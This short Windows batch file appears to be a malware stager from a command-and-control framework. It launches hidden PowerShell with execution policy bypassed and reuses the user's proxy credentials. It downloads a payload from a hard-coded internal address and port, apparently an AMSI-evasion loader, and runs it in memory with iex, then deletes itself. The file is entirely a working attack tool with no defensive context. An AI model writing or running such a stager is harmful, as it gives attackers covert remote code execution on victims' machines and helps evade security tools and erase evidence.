@echo off
start /b powershell.exe -nol -w 1 -nop -ep bypass "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://192.168.100.7:1336/download/powershell/Omlyb25weXRob25fYW1zaQ==') -UseBasicParsing|iex"
(goto) 2>nul & del "%~f0"
